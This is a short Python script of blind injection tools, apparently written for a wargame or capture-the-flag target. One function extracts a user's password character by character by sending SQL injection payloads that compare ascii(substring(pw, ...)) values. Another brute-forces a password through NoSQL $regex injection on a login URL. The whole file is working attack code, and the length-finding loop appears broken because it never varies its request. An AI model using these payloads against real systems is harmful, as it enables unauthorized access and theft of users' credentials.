from requests import get
import string

def find_length(url: str, param: dict, dstring: str, cookie: dict):
    pwlength = 1

    while True:
        req = get(url, params=param, cookies=cookie)
        if dstring in req.text:
            return pwlength
        else:
            pwlength += 1

def find_pw(name: str, url: str, param: dict, dstring: str, cookie: dict):
    length = find_length(url, param, dstring, cookie)
    password = ""
    for i in range(length):
        s = 1
        e = 127
        value = 64
        while True:
            param['pw'] = f"' or id = '{name}' and ascii(substring(pw, {i + 1}, 1)) = {value} #"
            print(param)
            req = get(url, params = param, cookies = cookie)
            if "Hello admin" in req.text:
                password += chr(value)
                break
            else:
                param[
                    'pw'
                ] = f"' or id = '{name}' and ascii(substring(pw, {i + 1}, 1)) > {value} #"
                req = get(url, params = param, cookies = cookie)
                if "Hello admin" in req.text:
                    s = value
                    value = (value + e) // 2
                else:
                    e = value
                    value = (s + value) // 2
    print("pw is -> ", password)

def nosql_pw(url: string, rname: string, dstring: str):
    print('\n' + url, rname, dstring)
    ALPHANUMERIC = string.digits + string.ascii_letters
    flag = ''
    for _ in range(32):
        for ch in ALPHANUMERIC:
            response = get(f'{url}/login?uid[$regex]={rname}&upw[$regex]=D.{{{flag}{ch}')
            if dstring in response.text:
                flag += ch
                print(flag)
                break
    print(f"Hacked by HVC -> {flag}")
